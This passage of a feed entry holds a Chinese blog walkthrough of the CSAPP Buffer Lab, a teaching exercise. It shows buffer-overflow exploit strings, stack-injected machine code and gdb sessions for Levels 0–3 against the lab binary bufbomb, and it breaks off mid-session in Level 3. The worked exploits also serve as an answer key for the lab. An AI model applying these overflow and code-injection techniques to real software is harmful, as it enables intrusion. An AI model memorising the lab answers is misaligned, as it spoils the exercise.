  </entry>
  
  <entry>
    <title>深入理解计算机系统|CSAPP-Bufferlab</title>
    <link href="http://yoursite.com/2018/05/12/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-CSAPP-Bufferlab/"/>
    <id>http://yoursite.com/2018/05/12/深入理解计算机系统-CSAPP-Bufferlab/</id>
    <published>2018-05-11T20:29:36.000Z</published>
    <updated>2018-05-13T03:13:53.412Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用<code>缓冲区溢出漏洞</code>生成攻击代码去修改一个32位的x86可执行程序的运行时行为。</p>
<h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><ul>
<li>IA32的栈帧结构，可参考：<a href="http://wuduozhi.me/2018/05/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C-5/" target="_blank" rel="external">深入理解计算机系统|汇编的世界-5</a></li>
<li>gdb调试，可参考：<a href="http://wuduozhi.me/2018/03/27/%E5%B7%A5%E5%85%B7-gdb%E8%B0%83%E8%AF%95/" target="_blank" rel="external">工具|gdb调试</a></li>
</ul>
<h3 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h3><p>实验讲义中主要包含了以下3个可执行文件：</p>
<ul>
<li>bufbomb 你所要攻击的缓冲区炸弹程序</li>
<li>makecookie 根据你所输入的userid生成一个cookie</li>
<li>hex2raw 一个生成攻击字符串的工具</li>
</ul>
<p>值得注意的是，<code>bufbomb</code>接受如下的参数：</p>
<ul>
<li>-h 打印帮助信息</li>
<li>-u userid 你应该一直为程序提供该参数，因为远程计分服务器需要该参数，bufbomb也需要该参数去确定你生成的cookie以确定你的攻击满足了条件，并且若干关键的栈地址也和该userid生成的cookie有关</li>
<li>-n 进入’Nitro’模式，在阶段4中使用</li>
<li>-s 将你的攻击字符串作为结果提交至计分服务器</li>
</ul>
<p>首先我们要输入userid生成一个cookie供后续使用，我这里使用uesrud为<code>xzz</code>。命令及结果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; ./makecookie xzz &gt; cookie   </div><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat cookie   </div><div class="line">0x52f8c747</div></pre></td></tr></table></figure>
<p>然后我们要将bufbomb反汇编以供后续攻击使用，命令如下：<code>objdump -d bufbomb &gt; bufbomb.s</code> 。</p>
<p>目标程序的通过<code>getbuf</code>函数从标准输入流中读取字符串，该函数具有缓冲区溢出的漏洞，我们的实验都是通过这个函数的漏洞展开的。</p>
<p><code>getbuf</code>函数：</p>
<pre><code>/ * Buffer size for getbuf* /
#define NORMAL_BUFFER_SIZE 32

int getbuf()
{
    char buf[NORMAL_BUFFER_SIZE];
    Gets(buf);
    return 1;
}
</code></pre><p><code>getbuf</code>函数的反汇编格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">08048c04 &lt;getbuf&gt;:</div><div class="line"> 8048c04:	55                   	push   %ebp</div><div class="line"> 8048c05:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8048c07:	83 ec 38             	sub    $0x38,%esp</div><div class="line"> 8048c0a:	8d 45 d8             	lea    -0x28(%ebp),%eax</div><div class="line"> 8048c0d:	89 04 24             	mov    %eax,(%esp) &lt;-- $eax保存输入字符串存放的地址, 由栈来传递给Gets函数</div><div class="line"> 8048c10:	e8 35 ff ff ff       	call   8048b4a &lt;Gets&gt;</div><div class="line"> 8048c15:	b8 01 00 00 00       	mov    $0x1,%eax</div><div class="line"> 8048c1a:	c9                   	leave  </div><div class="line"> 8048c1b:	c3                   	ret</div></pre></td></tr></table></figure></p>
<p>注意到函数总共开辟了<code>0x38=56</code>个字节的栈空间，然后<code>lea -0x28(%ebp),%eax</code>和<code>mov %eax,(%esp)</code>进行了参数字符串起始地址的构造，考虑到栈从高地址向低地址延伸，而<code>ebp</code>指向栈底，我们可以推测缓冲区总共是0x28=40个字节。所以能得到<code>getbuf</code>函数的栈帧如下图：</p>
<p><img src="/images/CSAPP-BufferLab-01.png" alt="getbuf栈帧"></p>
<p>那么所谓的缓冲区溢出也就是破坏<code>buf</code>到返回地址的内存空间，把需要跳转的地址通过溢出填入到返回地址中，改变程序的执行顺序。</p>
<h3 id="开始攻关"><a href="#开始攻关" class="headerlink" title="开始攻关"></a>开始攻关</h3><h4 id="Level-0-Candle"><a href="#Level-0-Candle" class="headerlink" title="Level 0 Candle"></a>Level 0 Candle</h4><p>The function getbuf is called within BUFBOMB by a function test having the following C code:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">/* test */</div><div class="line">void test()</div><div class="line">&#123;</div><div class="line">    int val;</div><div class="line">    /* Put canary on stack to detect possible corruption */</div><div class="line">    volatile int local = uniqueval();</div><div class="line">    val = getbuf();</div><div class="line">    /* Check for corrupted stack */</div><div class="line">    if (local != uniqueval()) &#123;</div><div class="line">	    printf(&quot;Sabotaged!: the stack has been corrupted\n&quot;);</div><div class="line">    &#125;else if (val == cookie) &#123;</div><div class="line">    	printf(&quot;Boom!: getbuf returned 0x%x\n&quot;, val);</div><div class="line">    	validate(3);</div><div class="line">    &#125; else &#123;</div><div class="line">    	printf(&quot;Dud: getbuf returned 0x%x\n&quot;, val);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>现在我们希望test函数从getbuf返回时不执行下一条代码，而是跳转至函数smoke，该函数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">void smoke()</div><div class="line">&#123;</div><div class="line">    printf(&quot;Smoke!: You called smoke()\n&quot;);</div><div class="line">    validate(0);</div><div class="line">    exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在该阶段中，由于smoke直接使得程序退出，所以我们不需要在意保存的%ebp的值，直接通过缓冲区溢出覆盖返回地址即可。通过反汇编得到smoke的汇编代码，可以得到smoke的起始地址<code>080490ba</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">080490ba &lt;smoke&gt;:</div><div class="line"> 80490ba:	55                   	push   %ebp</div><div class="line"> 80490bb:	89 e5                	mov    %esp,%ebp</div><div class="line"> 80490bd:	83 ec 18             	sub    $0x18,%esp</div><div class="line"> 80490c0:	c7 04 24 b5 9f 04 08 	movl   $0x8049fb5,(%esp)</div><div class="line"> 80490c7:	e8 74 f8 ff ff       	call   8048940 &lt;puts@plt&gt;</div><div class="line"> 80490cc:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</div><div class="line"> 80490d3:	e8 0c 00 00 00       	call   80490e4 &lt;validate&gt;</div><div class="line"> 80490d8:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</div><div class="line"> 80490df:	e8 ac f8 ff ff       	call   8048990 &lt;exit@plt&gt;</div></pre></td></tr></table></figure>
<p>根据以上的信息，我们的攻击代码 level0.txt 如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 ba 90 04 08 /* 保存的%ebp以及返回地址 注意是小端机器*/</div></pre></td></tr></table></figure></p>
<p>下面我们使用hex2raw生成攻击字符串并测试。结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ cat level0.txt | ./hex2raw | ./bufbomb -u xzz </div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line">Type string:Smoke!: You called smoke()</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
<h4 id="Level-1-Sparkler"><a href="#Level-1-Sparkler" class="headerlink" title="Level 1 Sparkler"></a>Level 1 Sparkler</h4><p>现在，我们希望getbuf返回时跳转至函数fizz同时能伪装成已经传递了cookie作为参数，该函数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">void fizz(int val)</div><div class="line">&#123;</div><div class="line">    if (val == cookie) &#123;</div><div class="line">    	printf(&quot;Fizz!: You called fizz(0x%x)\n&quot;, val);</div><div class="line">    	validate(1);</div><div class="line">    &#125; else</div><div class="line">    	printf(&quot;Misfire: You called fizz(0x%x)\n&quot;, val);</div><div class="line">    </div><div class="line">    exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在该阶段中，我们需要注意IA32中，参数是通过调用者的栈进行传递的，我们观察fizz的反汇编代码，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">0804906f &lt;fizz&gt;:</div><div class="line"> 804906f:	55                   	push   %ebp</div><div class="line"> 8049070:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8049072:	83 ec 18             	sub    $0x18,%esp</div><div class="line"> 8049075:	8b 45 08             	mov    0x8(%ebp),%eax</div><div class="line"> 8049078:	3b 05 e4 c1 04 08    	cmp    0x804c1e4,%eax</div><div class="line"> 804907e:	75 1e                	jne    804909e &lt;fizz+0x2f&gt;</div><div class="line"> 8049080:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 8049084:	c7 04 24 97 9f 04 08 	movl   $0x8049f97,(%esp)</div><div class="line"> 804908b:	e8 50 f8 ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 8049090:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)</div><div class="line"> 8049097:	e8 48 00 00 00       	call   80490e4 &lt;validate&gt;</div><div class="line"> 804909c:	eb 10                	jmp    80490ae &lt;fizz+0x3f&gt;</div><div class="line"> 804909e:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 80490a2:	c7 04 24 b8 a1 04 08 	movl   $0x804a1b8,(%esp)</div><div class="line"> 80490a9:	e8 32 f8 ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 80490ae:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</div><div class="line"> 80490b5:	e8 d6 f8 ff ff       	call   8048990 &lt;exit@plt&gt;</div></pre></td></tr></table></figure>
<p>从上述反汇编代码的第1行第4行和第5行，我们可以知道函数<code>fizz</code>的起始地址为<code>0804906f</code>，<code>val</code>保存在<code>0x8(%ebp)</code>中，cookie保存在固定的地址<code>0x804c1e4</code>中。根据以上的信息，我们的攻击代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 6f 90 04 08 /* 保存的%ebp以及返回地址 */</div><div class="line">00 00 00 00 47 c7 f8 52 /* cookie */</div></pre></td></tr></table></figure>
<p>注意到，从<code>getbuf</code>返回的时候，内存是这样的一个状态：</p>
<p><img src="/images/CSAPP-BufferLab-02.png" alt="level-01"></p>
<p>此时，已经跳转到 <code>fizz</code>函数哪里了，但现在的<code>%ebp</code>的值是<code>0x00000000</code>,不过幸好有<code>mov    %esp,%ebp</code>这条指令，把<code>%ebp</code>拯救回来，才能使<code>mov    0x8(%ebp),%eax</code>能得到我们放入的cookie。这时的内存状态是这样的：</p>
<p><img src="/images/CSAPP-BufferLab-03.png" alt="level-01"></p>
<p>执行结果:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ cat level1.txt | ./hex2raw | ./bufbomb -u xzz </div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line">Type string:Fizz!: You called fizz(0x52f8c747)</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
<h4 id="Level-2-Firecracker"><a href="#Level-2-Firecracker" class="headerlink" title="Level 2 Firecracker"></a>Level 2 Firecracker</h4><p>bufbomb中包含了一个全局变量global_value以及函数bang，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">int global_value = 0;</div><div class="line">void bang(int val)</div><div class="line">&#123;</div><div class="line">    if (global_value == cookie) &#123;</div><div class="line">	    printf(&quot;Bang!: You set global_value to 0x%x\n&quot;, global_value);</div><div class="line">    	validate(2);</div><div class="line">    &#125; else</div><div class="line">    	printf(&quot;Misfire: global_value = 0x%x\n&quot;, global_value);</div><div class="line"></div><div class="line">	exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在该阶段中，我们希望函数能在返回时跳转至bang，但是在这之前，要将全局变量global_value的值设置为cookie。那怎么设置呢？<strong>在栈上构建一段代码，然后在栈上执行相应的代码，实现相关的修改，最后从栈上返回至函数bang</strong>。</p>
<p>首先我们需要确定在进入getbuf时的栈地址，具体的命令和操作如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ gdb bufbomb</div><div class="line">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1</div><div class="line">Copyright (C) 2014 Free Software Foundation, Inc.</div><div class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</div><div class="line">This is free software: you are free to change and redistribute it.</div><div class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</div><div class="line">and &quot;show warranty&quot; for details.</div><div class="line">This GDB was configured as &quot;i686-linux-gnu&quot;.</div><div class="line">Type &quot;show configuration&quot; for configuration details.</div><div class="line">For bug reporting instructions, please see:</div><div class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</div><div class="line">Find the GDB manual and other documentation resources online at:</div><div class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</div><div class="line">For help, type &quot;help&quot;.</div><div class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</div><div class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</div><div class="line">(gdb) break getbuf</div><div class="line">Breakpoint 1 at 0x8048c0a</div><div class="line">(gdb) run -u xzz</div><div class="line">Starting program: /home/ubuntu/mybuflab_solved/bufbomb -u xzz</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048c0a in getbuf ()</div><div class="line">(gdb) disas getbuf</div><div class="line">Dump of assembler code for function getbuf:</div><div class="line">   0x08048c04 &lt;+0&gt;:	push   %ebp</div><div class="line">   0x08048c05 &lt;+1&gt;:	mov    %esp,%ebp</div><div class="line">   0x08048c07 &lt;+3&gt;:	sub    $0x38,%esp</div><div class="line">=&gt; 0x08048c0a &lt;+6&gt;:	lea    -0x28(%ebp),%eax</div><div class="line">   0x08048c0d &lt;+9&gt;:	mov    %eax,(%esp)</div><div class="line">   0x08048c10 &lt;+12&gt;:	call   0x8048b4a &lt;Gets&gt;</div><div class="line">   0x08048c15 &lt;+17&gt;:	mov    $0x1,%eax</div><div class="line">   0x08048c1a &lt;+22&gt;:	leave  </div><div class="line">   0x08048c1b &lt;+23&gt;:	ret    </div><div class="line">End of assembler dump.</div><div class="line">(gdb) print /x $ebp</div><div class="line">$1 = 0x55683450</div><div class="line">(gdb) print /x $esp</div><div class="line">$2 = 0x55683418</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
<p>通过在gdb中添加断点并观察，我们可以确定在执行函数<code>getbuf</code>时，栈底<code>%ebp</code>的值为<code>0x55683450</code>。</p>
<p>接下来我们要通过gcc和objdump生成攻击代码。我们首先新建一个level2-exploit.s文件，在其中编写相应的攻击代码，攻击代码的作用就是设置全解变量的值为cookie的值，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mov $0x52f8c747, %eax</div><div class="line">mov %eax, 0x804c1ec  ;设置全局变量</div><div class="line">add $16, %esp ;修改栈顶</div><div class="line">ret ;返回</div></pre></td></tr></table></figure>
<p>然后我们依次使用<code>gcc -m32 -c level2-exploit.s</code>和<code>objdump -d level2-exploit.o</code>将攻击代码汇编和反汇编，具体的命令和结果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ gcc -m32 -c level2-exploit.s </div><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ objdump -d level2-exploit.o</div><div class="line"></div><div class="line">level2-exploit.o:     file format elf32-i386</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">00000000 &lt;.text&gt;:</div><div class="line">   0:	b8 47 c7 f8 52       	mov    $0x52f8c747,%eax</div><div class="line">   5:	a3 ec c1 04 08       	mov    %eax,0x804c1ec</div><div class="line">   a:	83 c4 10             	add    $0x10,%esp</div><div class="line">   d:	c3                   	ret</div></pre></td></tr></table></figure>
<p>所以我们构建的攻击代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 58 34 68 55 /* 保存的%ebp以及返回地址(在栈上) */</div><div class="line">b8 47 c7 f8 52 a3 ec c1 </div><div class="line">04 08 83 c4 10 c3 00 00 /* 攻击代码 */</div><div class="line">22 90 04 08  			/* 返回地址指向函数bang */</div></pre></td></tr></table></figure></p>
<p>可以知道，我们的攻击思路是：<strong>在getbuf函数返回的时候，先将<code>pc</code>跳转到我们刚刚设计的攻击代码开始的地方，执行我们设计的攻击代码，设置全局变量的值，然后在跳转到<code>bang</code>函数执行。</strong></p>
<p>可能疑惑为什么要这么做？是怎么知道全局变量的地址的呢？为什么要修改栈指针且要加16呢？接下来一一解答：</p>
<p>对于全局变量的指针，我们可以通过<code>bang</code>函数的反汇编代码得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">08049022 &lt;bang&gt;:</div><div class="line"> 8049022:	55                   	push   %ebp</div><div class="line"> 8049023:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8049025:	83 ec 18             	sub    $0x18,%esp</div><div class="line"> 8049028:	a1 ec c1 04 08       	mov    0x804c1ec,%eax</div><div class="line"> 804902d:	3b 05 e4 c1 04 08    	cmp    0x804c1e4,%eax</div><div class="line"> 8049033:	75 1e                	jne    8049053 &lt;bang+0x31&gt;</div><div class="line"> 8049035:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 8049039:	c7 04 24 90 a1 04 08 	movl   $0x804a190,(%esp)</div><div class="line"> 8049040:	e8 9b f8 ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 8049045:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)</div><div class="line"> 804904c:	e8 93 00 00 00       	call   80490e4 &lt;validate&gt;</div><div class="line"> 8049051:	eb 10                	jmp    8049063 &lt;bang+0x41&gt;</div><div class="line"> 8049053:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 8049057:	c7 04 24 79 9f 04 08 	movl   $0x8049f79,(%esp)</div><div class="line"> 804905e:	e8 7d f8 ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 8049063:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</div><div class="line"> 804906a:	e8 21 f9 ff ff       	call   8048990 &lt;exit@plt&gt;</div></pre></td></tr></table></figure></p>
<p>在level-1中我们知道<code>0x804c1e4</code>是cookie的地址，那么这里<code>0x804c1ec</code>显然就是全局变量的地址了。</p>
<p>从getbuf返回时，我们的内存是这样的：</p>
<p><img src="/images/CSAPP-BufferLab-04.png" alt="level-2"></p>
<p>我们很巧妙的把pc指向了我们设置的攻击代码处，然后开始执行我们设置的代码，当指行完 <code>add    $0x10,%esp</code>的时候，内存空间是这样的：</p>
<p><img src="/images/CSAPP-BufferLab-05.png" alt="level-2"></p>
<p>然后执行<code>ret</code>，把栈顶的bang函数的首地址弹出给pc，在改变全局变量的值后，顺利地跳转到bang函数开始执行。</p>
<p>下面我们使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ cat level2.txt | ./hex2raw | ./bufbomb -u xzz</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line">Type string:Bang!: You set global_value to 0x52f8c747</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
<h4 id="Level-3-Dynamite"><a href="#Level-3-Dynamite" class="headerlink" title="Level 3 Dynamite"></a>Level 3 Dynamite</h4><p>Your job for this level is to supply an exploit string that will cause getbuf to return your cookie back to<br>test, rather than the value 1. You can see in the code for test that this will cause the program to go<br>“Boom!.” Your exploit code should set your cookie as the return value, restore any corrupted state, push<br>the correct return location on the stack, and execute a ret instruction to really return to test.</p>
<p>在前面的几个阶段中，我们所有的攻击都导致程序跳转至其他函数并退出。所以，使用会破坏栈的攻击代码是可行的。</p>
<p>在该阶段中，你需要修改程序的寄存器和内存状态，并且使程序能正确的返回值原调用者函数并且不出错。这就意味着我们需要做：</p>
<ul>
<li>在栈上执行机器代码</li>
<li>要恢复test函数的栈帧，也就是恢复test的<code>$esp</code>和<code>%ebp</code>，让test函数能继续执行</li>
</ul>
<p>具体来说，你需要让函数getbuf返回cookie而不是1至函数test。注意到在test中当返回值为cookie时程序会输出”Boom!”。你的攻击代码应当将cookie设置为返回值，恢复任何被破坏的状态，将正确的返回地址push到栈上，最终执行ret指令。</p>
<p>对于该阶段，我们的思路：和阶段2一样，通过溢出使程序跳转至栈上执行相应的攻击代码，修改返回值，修复破坏的<code>$ebp</code>,然后跳转到正确的地址</p>
<p>攻击代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mov 0x804c1e4, %eax   /* move cookie to %eax as return value */</div><div class="line">mov $0x55683480, %ebp  /* recovery %ebp */</div><div class="line">push 0x8048c93       /* return address */</div><div class="line">ret</div></pre></td></tr></table></figure></p>
<p>在攻击代码里，我们设置了返回值、恢复<code>%ebp</code>的值，但是并没有刻意恢复<code>$esp</code>,不过此时的<code>%esp</code>也是正确的，请各位猿友思考下这个问题。</p>
<p>对于这么得到旧的<code>%ebp</code>和正确返回地址的值，我们可以通过gdb调试，查看内存的值得到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ gdb bufbomb</div><div class="line">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1</div><div class="line">Copyright (C) 2014 Free Software Foundation, Inc.</div><div class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</div><div class="line">This is free software: you are free to change and redistribute it.</div><div class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</div><div class="line">and &quot;show warranty&quot; for details.</div><div class="line">This GDB was configured as &quot;i686-linux-gnu&quot;.</div><div class="line">Type &quot;show configuration&quot; for configuration details.</div><div class="line">For bug reporting instructions, please see:</div><div class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</div><div class="line">Find the GDB manual and other documentation resources online at:</div><div class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</div><div class="line">For help, type &quot;help&quot;.</div><div class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</div><div class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</div><div class="line">(gdb) b getbuf</div><div class="line">Breakpoint 1 at 0x8048c0a</div><div class="line">(gdb) run -u xzz</div><div class="line">Starting program: /home/ubuntu/mybuflab_solved/bufbomb -u xzz</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048c0a in getbuf ()</div><div class="line">(gdb) disas</div><div class="line">Dump of assembler code for function getbuf:</div><div class="line">   0x08048c04 &lt;+0&gt;:	push   %ebp</div><div class="line">   0x08048c05 &lt;+1&gt;:	mov    %esp,%ebp</div><div class="line">   0x08048c07 &lt;+3&gt;:	sub    $0x38,%esp</div><div class="line">=&gt; 0x08048c0a &lt;+6&gt;:	lea    